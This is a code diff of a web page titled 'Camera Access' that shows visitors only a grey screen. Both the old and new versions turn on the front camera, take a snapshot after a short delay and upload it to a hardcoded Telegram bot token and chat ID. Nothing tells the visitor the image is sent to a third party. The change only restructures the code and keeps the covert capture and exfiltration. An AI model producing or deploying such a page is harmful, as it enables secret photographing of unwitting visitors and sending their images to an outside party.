@@ -4,67 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera Access</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #888888;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-        .container {
-            text-align: center;
-        }
-        video {
-            display: none;
-        }
-    </style>
 </head>
-<body>
-
-    <div class="container">
-        <video id="preview" autoplay playsinline></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    </div>
+<body style="background-color: #888888; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
 
     <script>
-        const BOT_TOKEN = '8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM';
-        const CHAT_ID = '6539379136';
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
 
-        const preview = document.getElementById('preview');
-        const canvas = document.getElementById('canvas');
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        window.addEventListener('load', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                preview.srcObject = stream;
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append('chat_id', '6539379136');
+              formData.append('photo', blob, 'snapshot.jpg');
 
-                setTimeout(async () => {
-                    canvas.width = preview.videoWidth || 640;
-                    canvas.height = preview.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
-
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'snapshot.jpg');
-
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }, 'image/jpeg');
-
-                }, 1000);
-
-            } catch (err) {
-                console.error("Camera access denied:", err);
-            }
+              fetch('https://api.telegram.org/bot8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM/sendPhoto', {
+                method: 'POST',
+                body: formData
+              })
+              .then(response => response.json())
+              .then(data => {
+                console.log('Success:', data);
+              })
+              .catch(error => {
+                console.error('Error:', error);
+              });
+            }, 'image/jpeg');
+          }, 2000);
+        })
+        .catch(err => {
+          console.error('Camera Error:', err);
         });
     </script>
+
 </body>
 </html>
